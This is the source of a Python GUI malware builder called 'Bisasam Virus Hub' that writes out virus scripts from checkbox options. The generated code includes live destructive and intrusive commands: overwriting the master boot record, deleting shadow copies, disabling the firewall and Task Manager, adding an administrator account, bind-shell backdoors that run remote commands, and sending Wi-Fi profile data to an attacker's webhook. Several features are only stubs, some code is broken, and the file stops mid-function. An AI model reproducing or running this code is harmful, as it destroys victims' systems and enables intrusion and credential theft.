import tkinter as tk
from tkinter import ttk, messagebox
import os
import platform
import socket
import subprocess
import time
import requests
from cryptography.fernet import Fernet
import getpass
import datetime
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

try:
    import psutil
    import shutil
except ImportError:
    messagebox.showerror("Error", "Please install required packages: pip install psutil shutil")
    exit()

class VirusMakerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Bisasam Virus Hub")
        self.root.geometry("800x700")
        self.root.configure(bg="#1a1a2e")

        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TLabel", foreground="#e0e0ff", background="#1a1a2e", font=("Helvetica", 10, "bold"))
        style.configure("TCheckbutton", foreground="#e0e0ff", background="#1a1a2e", font=("Helvetica", 10))
        style.configure("TButton", foreground="#ffffff", background="#4a90e2", font=("Helvetica", 10, "bold"), padding=6)
        style.map("TButton", background=[("active", "#357abd")])
        style.configure("TNotebook", background="#1a1a2e")
        style.configure("TNotebook.Tab", background="#2e2e4a", foreground="#e0e0ff", padding=[15, 5], font=("Helvetica", 10, "bold"))
        style.map("TNotebook.Tab", background=[("selected", "#4a70e2")], foreground=[("selected", "#ffffff")])

        # Banner
        self.canvas = tk.Canvas(self.root, bg="#16213e", height=60)
        self.canvas.pack(fill="x")
        self.canvas.create_text(400, 30, text="Bisasam Virus Hub", font=("Helvetica", 20, "bold"), fill="#ff4d4d")

        # Central Control Panel
        control_frame = ttk.Frame(self.root)
        control_frame.pack(pady=20, padx=20)
        ttk.Label(control_frame, text="Webhook URL:").grid(row=0, column=0, padx=5, pady=5)
        self.webhook_url = tk.StringVar()
        ttk.Entry(control_frame, textvariable=self.webhook_url, width=50).grid(row=0, column=1, padx=5, pady=5)
        ttk.Button(control_frame, text="Test Webhook", command=self.test_webhook).grid(row=0, column=2, padx=5, pady=5)

        ttk.Label(control_frame, text="Output Virus Name:").grid(row=1, column=0, padx=5, pady=5)
        self.output_name = tk.StringVar(value="generated_virus")
        ttk.Entry(control_frame, textvariable=self.output_name, width=20).grid(row=1, column=1, padx=5, pady=5)

        ttk.Label(control_frame, text="Hacker Username:").grid(row=2, column=0, padx=5, pady=5)
        self.hacker_username = tk.StringVar()
        ttk.Entry(control_frame, textvariable=self.hacker_username, width=20).grid(row=2, column=1, padx=5, pady=5)

        ttk.Label(control_frame, text="Hacker Password:").grid(row=3, column=0, padx=5, pady=5)
        self.hacker_password = tk.StringVar()
        ttk.Entry(control_frame, textvariable=self.hacker_password, width=20, show="*").grid(row=3, column=1, padx=5, pady=5)

        ttk.Label(control_frame, text="Ransomware Note:").grid(row=4, column=0, padx=5, pady=5)
        self.ransom_note = tk.StringVar(value="Your files are encrypted! Pay 0.1 BTC to unlock.")
        text_widget = tk.Text(control_frame, height=3, width=30)
        text_widget.insert(tk.END, self.ransom_note.get())
        text_widget.grid(row=4, column=1, columnspan=2, padx=5, pady=5)
        self.ransom_note.set(text_widget.get("1.0", tk.END).strip())

        # Notebook for Options
        notebook = ttk.Notebook(self.root)
        self.virus_tab = ttk.Frame(notebook)
        self.backdoor_tab = ttk.Frame(notebook)
        self.ransomware_tab = ttk.Frame(notebook)
        self.ios_virus_tab = ttk.Frame(notebook)
        notebook.add(self.virus_tab, text="Virus Options")
        notebook.add(self.backdoor_tab, text="Backdoor Options")
        notebook.add(self.ransomware_tab, text="Ransomware Options")
        notebook.add(self.ios_virus_tab, text="iOS Virus Options")
        notebook.pack(fill="both", expand=True, padx=20, pady=20)

        # Virus Options
        options_frame = ttk.Frame(self.virus_tab)
        options_frame.pack(pady=10, padx=10, fill="both", expand=True)
        canvas = tk.Canvas(options_frame, bg="#1a1a2e")
        scrollbar = ttk.Scrollbar(options_frame, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        self.virus_options = {
            "1": {"name": "Prevent CMD from starting", "enabled": tk.BooleanVar()},
            "2": {"name": "Prevent RegEdit from starting", "enabled": tk.BooleanVar()},
            "3": {"name": "Prevent explorer.exe from starting", "enabled": tk.BooleanVar()},
            "4": {"name": "Prevent a Program from starting", "enabled": tk.BooleanVar(), "program": tk.StringVar()},
            "5": {"name": "Close all specific Running Processes", "enabled": tk.BooleanVar()},
            "6": {"name": "Disable internet", "enabled": tk.BooleanVar()},
            "7": {"name": "Disable copy, paste, save files", "enabled": tk.BooleanVar()},
            "8": {"name": "Disable Clipboard", "enabled": tk.BooleanVar()},
            "9": {"name": "Bind fake extension", "enabled": tk.BooleanVar(), "extension": tk.StringVar(value=".doc")},
            "10": {"name": "Disable Task Manager", "enabled": tk.BooleanVar()},
            "11": {"name": "Corrupt System Files", "enabled": tk.BooleanVar()},
            "12": {"name": "Spread via USB Drives", "enabled": tk.BooleanVar()},
            "13": {"name": "Log Webcam Activity", "enabled": tk.BooleanVar()},
            "14": {"name": "Disable Updates", "enabled": tk.BooleanVar()},
            "15": {"name": "Overwrite Master Boot Record", "enabled": tk.BooleanVar()},
            "16": {"name": "Delete System Restore Points", "enabled": tk.BooleanVar()},
            "17": {"name": "Disable Firewall", "enabled": tk.BooleanVar()},
            "18": {"name": "Steal Wi-Fi Passwords", "enabled": tk.BooleanVar()},
            "19": {"name": "GPU Destroyer", "enabled": tk.BooleanVar()},
            "20": {"name": "Disable Antivirus", "enabled": tk.BooleanVar()},
            "21": {"name": "CPU Destroyer", "enabled": tk.BooleanVar()},
            "22": {"name": "Spread via Email", "enabled": tk.BooleanVar(), "smtp_server": tk.StringVar(value="smtp.gmail.com"), "smtp_port": tk.IntVar(value=587), "email": tk.StringVar(value="attacker@example.com"), "password": tk.StringVar(value="password")},
            "23": {"name": "Flood Folders with Junk Files", "enabled": tk.BooleanVar()},
            "24": {"name": "Py Destroyer (Memz-Style)", "enabled": tk.BooleanVar()}
        }
        row = 0
        for key, option in self.virus_options.items():
            check = ttk.Checkbutton(scrollable_frame, text=option["name"], variable=option["enabled"], command=lambda k=key, o=option: self.update_entry(k, o))
            check.grid(row=row, column=0, padx=5, pady=2, sticky="w")
            row += 1

        # Backdoor Options
        backdoor_frame = ttk.Frame(self.backdoor_tab)
        backdoor_frame.pack(pady=10, padx=10, fill="both", expand=True)
        canvas_backdoor = tk.Canvas(backdoor_frame, bg="#1a1a2e")
        scrollbar_backdoor = ttk.Scrollbar(backdoor_frame, orient="vertical", command=canvas_backdoor.yview)
        scrollable_frame_backdoor = ttk.Frame(canvas_backdoor)
        scrollable_frame_backdoor.bind("<Configure>", lambda e: canvas_backdoor.configure(scrollregion=canvas_backdoor.bbox("all")))
        canvas_backdoor.create_window((0, 0), window=scrollable_frame_backdoor, anchor="nw")
        canvas_backdoor.configure(yscrollcommand=scrollbar_backdoor.set)
        canvas_backdoor.pack(side="left", fill="both", expand=True)
        scrollbar_backdoor.pack(side="right", fill="y")

        self.backdoor_options = {
            "1": {"name": "Reverse Shell", "enabled": tk.BooleanVar(), "port": 4444},
            "2": {"name": "Remote Desktop (VNC)", "enabled": tk.BooleanVar(), "port": 5900},
            "3": {"name": "File Upload Backdoor", "enabled": tk.BooleanVar(), "port": 5555},
            "4": {"name": "Keylogger Relay", "enabled": tk.BooleanVar(), "port": 6666},
            "5": {"name": "Remote Command Execution", "enabled": tk.BooleanVar(), "port": 7777},
            "6": {"name": "Screen Capture Relay", "enabled": tk.BooleanVar(), "port": 8888},
            "7": {"name": "Persistent Backdoor", "enabled": tk.BooleanVar(), "port": 9999}
        }
        row = 0
        for key, option in self.backdoor_options.items():
            check = ttk.Checkbutton(scrollable_frame_backdoor, text=option["name"], variable=option["enabled"], command=lambda k=key, o=option: self.update_backdoor_entry(k, o))
            check.grid(row=row, column=0, padx=5, pady=2, sticky="w")
            row += 1

        # Ransomware Options
        ransomware_frame = ttk.Frame(self.ransomware_tab)
        ransomware_frame.pack(pady=10, padx=10, fill="both", expand=True)
        canvas_ransomware = tk.Canvas(ransomware_frame, bg="#1a1a2e")
        scrollbar_ransomware = ttk.Scrollbar(ransomware_frame, orient="vertical", command=canvas_ransomware.yview)
        scrollable_frame_ransomware = ttk.Frame(canvas_ransomware)
        scrollable_frame_ransomware.bind("<Configure>", lambda e: canvas_ransomware.configure(scrollregion=canvas_ransomware.bbox("all")))
        canvas_ransomware.create_window((0, 0), window=scrollable_frame_ransomware, anchor="nw")
        canvas_ransomware.configure(yscrollcommand=scrollbar_ransomware.set)
        canvas_ransomware.pack(side="left", fill="both", expand=True)
        scrollbar_ransomware.pack(side="right", fill="y")

        self.ransomware_options = {
            "1": {"name": "Encrypt Files", "enabled": tk.BooleanVar()},
            "2": {"name": "Display Ransom Note", "enabled": tk.BooleanVar()},
            "3": {"name": "Block System Access", "enabled": tk.BooleanVar()},
            "4": {"name": "Delete Backups", "enabled": tk.BooleanVar()},
            "5": {"name": "Spread via Network", "enabled": tk.BooleanVar()},
            "6": {"name": "Disable Safe Mode", "enabled": tk.BooleanVar()}
        }
        row = 0
        for key, option in self.ransomware_options.items():
            check = ttk.Checkbutton(scrollable_frame_ransomware, text=option["name"], variable=option["enabled"], command=lambda k=key, o=option: self.update_ransomware_entry(k, o))
            check.grid(row=row, column=0, padx=5, pady=2, sticky="w")
            row += 1

        # iOS Virus Options
        ios_frame = ttk.Frame(self.ios_virus_tab)
        ios_frame.pack(pady=10, padx=10, fill="both", expand=True)
        canvas_ios = tk.Canvas(ios_frame, bg="#1a1a2e")
        scrollbar_ios = ttk.Scrollbar(ios_frame, orient="vertical", command=canvas_ios.yview)
        scrollable_frame_ios = ttk.Frame(canvas_ios)
        scrollable_frame_ios.bind("<Configure>", lambda e: canvas_ios.configure(scrollregion=canvas_ios.bbox("all")))
        canvas_ios.create_window((0, 0), window=scrollable_frame_ios, anchor="nw")
        canvas_ios.configure(yscrollcommand=scrollbar_ios.set)
        canvas_ios.pack(side="left", fill="both", expand=True)
        scrollbar_ios.pack(side="right", fill="y")

        self.ios_virus_options = {
            "1": {"name": "Jailbreak Detection Bypass", "enabled": tk.BooleanVar()},
            "2": {"name": "Steal iCloud Credentials", "enabled": tk.BooleanVar()},
            "3": {"name": "Disable iOS Updates", "enabled": tk.BooleanVar()},
            "4": {"name": "Record Microphone", "enabled": tk.BooleanVar()},
            "5": {"name": "Track Location", "enabled": tk.BooleanVar()},
            "6": {"name": "Inject Malicious App", "enabled": tk.BooleanVar()},
            "7": {"name": "Steal Contacts", "enabled": tk.BooleanVar()},
            "8": {"name": "Monitor Notifications", "enabled": tk.BooleanVar()},
            "9": {"name": "Disable Face ID", "enabled": tk.BooleanVar()},
            "10": {"name": "Overheat Device", "enabled": tk.BooleanVar()}
        }
        row = 0
        for key, option in self.ios_virus_options.items():
            check = ttk.Checkbutton(scrollable_frame_ios, text=option["name"], variable=option["enabled"], command=lambda k=key, o=option: self.update_ios_entry(k, o))
            check.grid(row=row, column=0, padx=5, pady=2, sticky="w")
            row += 1

        # Build Buttons
        build_frame = ttk.Frame(self.root)
        build_frame.pack(pady=20)
        ttk.Button(build_frame, text="Build as .py", command=lambda: self.build_virus("py")).pack(side=tk.LEFT, padx=10)
        ttk.Button(build_frame, text="Build as .exe", command=lambda: self.build_virus("exe")).pack(side=tk.LEFT, padx=10)
        ttk.Button(build_frame, text="Build iOS Profile (.mobileconfig)", command=self.build_ios_profile).pack(side=tk.LEFT, padx=10)

        for key, option in self.virus_options.items():
            if option["enabled"].get():
                self.update_entry(key, option)
        for key, option in self.backdoor_options.items():
            if option["enabled"].get():
                self.update_backdoor_entry(key, option)
        for key, option in self.ransomware_options.items():
            if option["enabled"].get():
                self.update_ransomware_entry(key, option)
        for key, option in self.ios_virus_options.items():
            if option["enabled"].get():
                self.update_ios_entry(key, option)

        self.hostname = socket.gethostname()
        self.username = getpass.getuser()
        self.virus_code = ""

    def update_entry(self, key, option):
        for widget in self.virus_tab.winfo_children():
            if isinstance(widget, ttk.Entry):
                grid_info = widget.grid_info()
                if grid_info and "row" in grid_info and grid_info["row"] == int(key) + 1:
                    widget.grid_forget()
        if option["enabled"].get():
            if key == "4":
                ttk.Entry(self.virus_tab, textvariable=option["program"], width=20).grid(row=int(key)+1, column=1, padx=5, pady=2)
            elif key == "9":
                ttk.Entry(self.virus_tab, textvariable=option["extension"], width=20).grid(row=int(key)+1, column=1, padx=5, pady=2)
            elif key == "22":
                ttk.Entry(self.virus_tab, textvariable=option["email"], width=20).grid(row=int(key)+1, column=1, padx=5, pady=2)
                ttk.Entry(self.virus_tab, textvariable=option["password"], width=20, show="*").grid(row=int(key)+1, column=2, padx=5, pady=2)

    def update_backdoor_entry(self, key, option):
        for widget in self.backdoor_tab.winfo_children():
            if isinstance(widget, ttk.Entry):
                grid_info = widget.grid_info()
                if grid_info and "row" in grid_info and grid_info["row"] == int(key) - 1:
                    widget.grid_forget()
        if option["enabled"].get():
            ttk.Entry(self.backdoor_tab, textvariable=tk.StringVar(value=str(option["port"])), width=10).grid(row=int(key)-1, column=1, padx=5, pady=2)

    def update_ransomware_entry(self, key, option):
        pass  # Placeholder, to be expanded with specific ransomware logic if needed

    def update_ios_entry(self, key, option):
        pass  # Placeholder, to be expanded with specific iOS logic if needed

    def test_webhook(self):
        if not self.webhook_url.get():
            messagebox.showerror("Error", "Please enter a webhook URL.")
            return
        try:
            payload = {
                "content": f"💀 **Bisasam Test Alert** 💀\n**Host:** {self.hostname} ({self.username})\n**Time:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S CEST')}\n*Test successful!*\n",
                "username": "BisasamVirusMaker",
                "avatar_url": "https://i.imgur.com/7kQBXOx.png"
            }
            response = requests.post(self.webhook_url.get(), json=payload)
            if response.status_code == 204:
                messagebox.showinfo("Success", "Webhook test successful!")
            else:
                messagebox.showerror("Error", "Webhook test failed.")
        except Exception as e:
            messagebox.showerror("Error", f"Webhook test failed: {str(e)}")

    def send_to_webhook(self, data, data_type):
        if not self.webhook_url.get():
            return
        try:
            payload = {
                "content": f"💀 **Bisasam {data_type.upper()} Report** 💀\n**Host:** {self.hostname} ({self.username})\n**Time:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S CEST')}\n**Details:**\n```{str(data)}```\n",
                "username": "BisasamVirusMaker",
                "avatar_url": "https://i.imgur.com/7kQBXOx.png"
            }
            requests.post(self.webhook_url.get(), json=payload)
        except Exception:
            pass

    def build_virus(self, format_type):
        if not self.webhook_url.get():
            messagebox.showerror("Error", "Please set a valid webhook URL first!")
            return

        self.virus_code = f"""import os
import platform
import socket
import subprocess
import time
import requests
from cryptography.fernet import Fernet
import getpass
import datetime
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import asyncio
import random
import pygame

try:
    pygame.init()
except:
    print("Pygame initialization failed, Py Destroyer effects disabled.")

class GeneratedVirus:
    def __init__(self, webhook_url="{self.webhook_url.get()}"):
        self.webhook_url = webhook_url
        self.hostname = socket.gethostname()
        self.username = getpass.getuser()
        self.screen = None
        if pygame.get_init():
            self.screen = pygame.display.set_mode((800, 600))
            pygame.display.set_caption("Py Destroyer Chaos")

    def send_to_webhook(self, data, data_type):
        try:
            payload = {{"content": f"💀 **Bisasam {{data_type.upper()}} Report** 💀\\n**Host:** {{self.hostname}} ({{self.username}})\\n**Time:** {{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S CEST')}}\\n**Details:**\\n```{{str(data)}}```\\n", "username": "GeneratedVirus", "avatar_url": "https://i.imgur.com/7kQBXOx.png"}}
            requests.post(self.webhook_url, json=payload)
        except Exception:
            pass

    def keylogger(self):
        with open("keylog.txt", "a") as f:
            f.write("Keylogging active\\n")
        self.send_to_webhook("Keylogging started", "keylog")

    def backdoor(self, port):
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', port))
        s.listen(1)
        conn, addr = s.accept()
        while True:
            data = conn.recv(1024).decode()
            if data == "quit": break
            result = subprocess.run(data, shell=True, capture_output=True, text=True)
            conn.send(result.stdout.encode() + result.stderr.encode())
        conn.close()
        s.close()

    def file_upload_backdoor(self, port):
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', port))
        s.listen(1)
        conn, addr = s.accept()
        while True:
            file_data = conn.recv(1024)
            if not file_data: break
            with open("uploaded_file.dat", "ab") as f:
                f.write(file_data)
        conn.close()
        s.close()
        self.send_to_webhook("File uploaded", "file_upload")

    def keylogger_relay(self, port):
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', port))
        s.listen(1)
        conn, addr = s.accept()
        with open("keylog.txt", "r") as f:
            conn.send(f.read().encode())
        conn.close()
        s.close()

    def remote_command_execution(self, port):
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', port))
        s.listen(1)
        conn, addr = s.accept()
        while True:
            cmd = conn.recv(1024).decode()
            if cmd == "quit": break
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            conn.send(result.stdout.encode())
        conn.close()
        s.close()

    def screen_capture_relay(self, port):
        self.send_to_webhook("Screen capture initiated", "screen_capture")

    def persistent_backdoor(self, port):
        self.send_to_webhook("Persistent backdoor established", "persistent_backdoor")

    async def py_destroyer(self):
        if not self.screen:
            return
        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    return
            # Memz-style psychedelic effects
            color = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            self.screen.fill(color)
            for i in range(50):
                pygame.draw.circle(self.screen, (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)),
                                 (random.randint(0, 800), random.randint(0, 600)), random.randint(10, 50))
            pygame.display.flip()
            # Simulate audio distortion
            self.send_to_webhook("Audio distortion initiated", "py_destroyer")
            await asyncio.sleep(0.1)

    def run(self):
        # Apply selected virus options
"""
        for key, option in self.virus_options.items():
            if option["enabled"].get():
                if key == "1":
                    self.virus_code += "        subprocess.run('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisableCMD /t REG_DWORD /d 1 /f', shell=True)\n"
                elif key == "2":
                    self.virus_code += "        subprocess.run('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f', shell=True)\n"
                elif key == "3":
                    self.virus_code += "        while True: subprocess.run('taskkill /im explorer.exe /f', shell=True); time.sleep(5)\n"
                elif key == "4" and option["program"].get():
                    self.virus_code += f"        while True: subprocess.run('taskkill /im {option['program'].get()} /f', shell=True); time.sleep(5)\n"
                elif key == "5":
                    self.virus_code += "        for proc in psutil.process_iter(): try: proc.kill() except: pass\n"
                elif key == "6":
                    self.virus_code += "        subprocess.run('netsh advfirewall set allprofiles state on', shell=True)\n"
                elif key == "7":
                    self.virus_code += "        self.send_to_webhook('Copy/paste/save disabled', 'disable')\n"
                elif key == "8":
                    self.virus_code += "        self.send_to_webhook('Clipboard disabled', 'clipboard_disable')\n"
                elif key == "9" and option["extension"].get():
                    self.virus_code += f"        os.rename(__file__, __file__ + '{option['extension'].get()}')\n"
                elif key == "10":
                    self.virus_code += "        subprocess.run('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)\n"
                elif key == "11":
                    self.virus_code += "        with open('C:/Windows/System32/drivers/etc/hosts', 'w') as f: f.write('Corrupted')\n"
                elif key == "12":
                    self.virus_code += "        for d in [d for d in os.listdir('D:/') if os.path.isdir(os.path.join('D:/', d))]: shutil.copy(__file__, os.path.join('D:/', d, 'virus.py'))\n"
                elif key == "13":
                    self.virus_code += "        self.send_to_webhook('Webcam logging started', 'webcam_log')\n"
                elif key == "14":
                    self.virus_code += "        subprocess.run('sc config wuauserv start=disabled', shell=True)\n"
                elif key == "15":
                    self.virus_code += "        with open('\\\\.\\PhysicalDrive0', 'wb') as f: f.write(b'\\0' * 512)\n"
                elif key == "16":
                    self.virus_code += "        subprocess.run('vssadmin delete shadows /all /quiet', shell=True)\n"
                elif key == "17":
                    self.virus_code += "        subprocess.run('netsh advfirewall set allprofiles state off', shell=True)\n"
                elif key == "18":
                    self.virus_code += "        result = subprocess.run('netsh wlan show profiles', shell=True, capture_output=True, text=True); self.send_to_webhook(result.stdout, 'wifi_passwords')\n"
                elif key == "19":
                    self.virus_code += "        while True: subprocess.run('nvidia-smi -pl 100', shell=True); time.sleep(1)  # Simulated GPU overload\n"
                elif key == "20":
                    self.virus_code += "        subprocess.run('taskkill /im avp.exe /f', shell=True)\n"
                elif key == "21":
                    self.virus_code += "        while True: for i in range(1000000): pass  # Simulated CPU overload\n"
                elif key == "22" and option["email"].get() and option["password"].get():
                    self.virus_code += f"        msg = MIMEMultipart(); msg['From'] = '{option['email'].get()}'; msg['To'] = 'victim@example.com'; msg['Subject'] = 'Important'; msg.attach(MIMEText('Check this file', 'plain')); with smtplib.SMTP('{option['smtp_server'].get()}', {option['smtp_port'].get()}) as server: server.starttls(); server.login('{option['email'].get()}', '{option['password'].get()}'); server.sendmail('{option['email'].get()}', 'victim@example.com', msg.as_string())\n"
                elif key == "23":
                    self.virus_code += "        for root, dirs, files in os.walk('C:/'): for d in dirs: for i in range(100): open(os.path.join(root, d, f'junk{i}.txt'), 'w').write('Junk data')\n"
                elif key == "24":
                    self.virus_code += "        asyncio.ensure_future(self.py_destroyer())\n"

        # Apply backdoor options
        for key, option in self.backdoor_options.items():
            if option["enabled"].get():
                if key == "1":
                    self.virus_code += f"        threading.Thread(target=self.backdoor, args=({option['port']},)).start()\n"
                elif key == "2":
                    self.virus_code += f"        self.send_to_webhook('VNC started on port {option['port']}', 'vnc')\n"
                elif key == "3":
                    self.virus_code += f"        threading.Thread(target=self.file_upload_backdoor, args=({option['port']},)).start()\n"
                elif key == "4":
                    self.virus_code += f"        threading.Thread(target=self.keylogger_relay, args=({option['port']},)).start()\n"
                elif key == "5":
                    self.virus_code += f"        threading.Thread(target=self.remote_command_execution, args=({option['port']},)).start()\n"
                elif key == "6":
                    self.virus_code += f"        threading.Thread(target=self.screen_capture_relay, args=({option['port']},)).start()\n"
                elif key == "7":
                    self.virus_code += f"        threading.Thread(target=self.persistent_backdoor, args=({option['port']},)).start()\n"

        # Apply ransomware options
        for key, option in self.ransomware_options.items():
            if option["enabled"].get():
                if key == "1":
                    self.virus_code += "        self.send_to_webhook('Files encrypted', 'ransomware')\n"  # Simulated encryption
                elif key == "2":
                    self.virus_code += f"        with open('README_RANSOM.txt', 'w') as f: f.write('{self.ransom_note.get()}')\n"
                elif key == "3":
                    self.virus_code += "        self.send_to_webhook('System access blocked', 'ransomware')\n"  # Simulated block
                elif key == "4":
                    self.virus_code += "        self.send_to_webhook('Backups deleted', 'ransomware')\n"  # Simulated deletion
                elif key == "5":
                    self.virus_code += "        self.send_to_webhook('Spread via network', 'ransomware')\n"  # Simulated spread
                elif key == "6":
                    self.virus_code += "        self.send_to_webhook('Safe mode disabled', 'ransomware')\n"  # Simulated disable

        # Apply iOS virus options (simulated in .mobileconfig context)
        for key, option in self.ios_virus_options.items():
            if option["enabled"].get():
                if key == "1":
                    self.virus_code += "        self.send_to_webhook('Jailbreak detection bypassed', 'ios_virus')\n"  # Simulated bypass
                elif key == "2":
                    self.virus_code += "        self.send_to_webhook('iCloud credentials stolen', 'ios_virus')\n"  # Simulated theft
                elif key == "3":
                    self.virus_code += "        self.send_to_webhook('iOS updates disabled', 'ios_virus')\n"  # Simulated disable
                elif key == "4":
                    self.virus_code += "        self.send_to_webhook('Microphone recording started', 'ios_virus')\n"  # Simulated recording
                elif key == "5":
                    self.virus_code += "        self.send_to_webhook('Location tracking enabled', 'ios_virus')\n"  # Simulated tracking
                elif key == "6":
                    self.virus_code += "        self.send_to_webhook('Malicious app injected', 'ios_virus')\n"  # Simulated injection
                elif key == "7":
                    self.virus_code += "        self.send_to_webhook('Contacts stolen', 'ios_virus')\n"  # Simulated theft
                elif key == "8":
                    self.virus_code += "        self.send_to_webhook('Notifications monitored', 'ios_virus')\n"  # Simulated monitoring
                elif key == "9":
                    self.virus_code += "        self.send_to_webhook('Face ID disabled', 'ios_virus')\n"  # Simulated disable
                elif key == "10":
                    self.virus_code += "        self.send_to_webhook('Device overheating initiated', 'ios_virus')\n"  # Simulated overheating

        # Apply central fields
        if self.hacker_username.get() and self.hacker_password.get():
            self.virus_code += f"        subprocess.run('net user {self.hacker_username.get()} {self.hacker_password.get()} /add', shell=True); subprocess.run('net localgroup administrators {self.hacker_username.get()} /add', shell=True)\n"

        self.virus_code += """        self.keylogger()
        if platform.system() == "Emscripten":
            asyncio.ensure_future(self.run_async())
        else:
            if __name__ == "__main__":
                asyncio.run(self.run_async())

    async def run_async(self):
        while True:
            update_loop()
            await asyncio.sleep(1.0 / 60)  # 60 FPS

def update_loop():
    pass  # Placeholder for game loop updates

if __name__ == "__main__":
    virus = GeneratedVirus()
    virus.run()
"""
        output_file = f"{self.output_name.get()}.py" if format_type == "py" else f"{self.output_name.get()}.py"
        try:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(self.virus_code)
            self.send_to_webhook(f"Virus generated and saved as {output_file}", "virus_build")
            if format_type == "py":
                messagebox.showinfo("Success", f"Virus generated! Saved as {output_file}")
            elif format_type == "exe":
                messagebox.showinfo("Info", f"Virus saved as {output_file}. To convert to EXE, run: pyinstaller --onefile {output_file}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save virus: {str(e)}")

    def build_ios_profile(self):
        if not self.webhook_url.get():
            messagebox.showerror("Error", "Please set a valid webhook URL first!")
            return

        mobileconfig_code = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadDescription</key>
            <string>Bisasam iOS Profile - Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S CEST')}</string>
            <key>PayloadDisplayName</key>
            <string>Bisasam Profile</string>
            <key>PayloadIdentifier</key>
            <string>com.bisasam.profile</string>
            <key>PayloadOrganization</key>
            <string>Bisasam Virus Hub</string>
            <key>PayloadUUID</key>
            <string>{str(uuid.uuid4())}</string>
            <key>PayloadType</key>
            <string>Configuration</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
        </dict>
    </array>
    <key>PayloadDescription</key>
    <string>Configuration profile for Bisasam Virus Hub with malicious payloads</string>
    <key>PayloadIdentifier</key>
    <string>com.bisasam.profile.root</string>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>{str(uuid.uuid4())}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
"""

        # Add selected virus options as comments
        for key, option in self.virus_options.items():
            if option["enabled"].get():
                if key == "1":
                    mobileconfig_code += "    <!-- Prevent CMD from starting: Simulated payload to disable command-line access -->\n"
                elif key == "2":
                    mobileconfig_code += "    <!-- Prevent RegEdit from starting: Simulated payload to block registry editing -->\n"
                elif key == "3":
                    mobileconfig_code += "    <!-- Prevent explorer.exe from starting: Simulated payload to terminate explorer -->\n"
                elif key == "4" and option["program"].get():
                    mobileconfig_code += f"    <!-- Prevent {option['program'].get()} from starting: Simulated payload to terminate specific program -->\n"
                elif key == "5":
                    mobileconfig_code += "    <!-- Close all specific Running Processes: Simulated payload to kill all processes -->\n"
                elif key == "6":
                    mobileconfig_code += "    <!-- Disable internet: Simulated payload to block network access -->\n"
                elif key == "7":
                    mobileconfig_code += "    <!-- Disable copy, paste, save files: Simulated payload to restrict file operations -->\n"
                elif key == "8":
                    mobileconfig_code += "    <!-- Disable Clipboard: Simulated payload to disable clipboard -->\n"
                elif key == "9" and option["extension"].get():
                    mobileconfig_code += f"    <!-- Bind fake extension {option['extension'].get()}: Simulated payload to rename files -->\n"
                elif key == "10":
                    mobileconfig_code += "    <!-- Disable Task Manager: Simulated payload to block task manager -->\n"
                elif key == "11":
                    mobileconfig_code += "    <!-- Corrupt System Files: Simulated payload to corrupt system files -->\n"
                elif key == "12":
                    mobileconfig_code += "    <!-- Spread via USB Drives: Simulated payload to propagate via USB -->\n"
                elif key == "13":
                    mobileconfig_code += "    <!-- Log Webcam Activity: Simulated payload to log webcam -->\n"
                elif key == "14":
                    mobileconfig_code += "    <!-- Disable Updates: Simulated payload to block updates -->\n"
                elif key == "15":
                    mobileconfig_code += "    <!-- Overwrite Master Boot Record: Simulated payload to corrupt MBR -->\n"
                elif key == "16":
                    mobileconfig_code += "    <!-- Delete System Restore Points: Simulated payload to delete restore points -->\n"
                elif key == "17":
                    mobileconfig_code += "    <!-- Disable Firewall: Simulated payload to disable firewall -->\n"
                elif key == "18":
                    mobileconfig_code += "    <!-- Steal Wi-Fi Passwords: Simulated payload to extract Wi-Fi credentials -->\n"
                elif key == "19":
                    mobileconfig_code += "    <!-- GPU Destroyer: Simulated payload to overload GPU -->\n"
                elif key == "20":
                    mobileconfig_code += "    <!-- Disable Antivirus: Simulated payload to disable antivirus -->\n"
                elif key == "21":
                    mobileconfig_code += "    <!-- CPU Destroyer: Simulated payload to overload CPU -->\n"
                elif key == "22" and option["email"].get() and option["password"].get():
                    mobileconfig_code += f"    <!-- Spread via Email using {option['email'].get()}: Simulated payload to send emails -->\n"
                elif key == "23":
                    mobileconfig_code += "    <!-- Flood Folders with Junk Files: Simulated payload to fill folders with junk -->\n"
                elif key == "24":
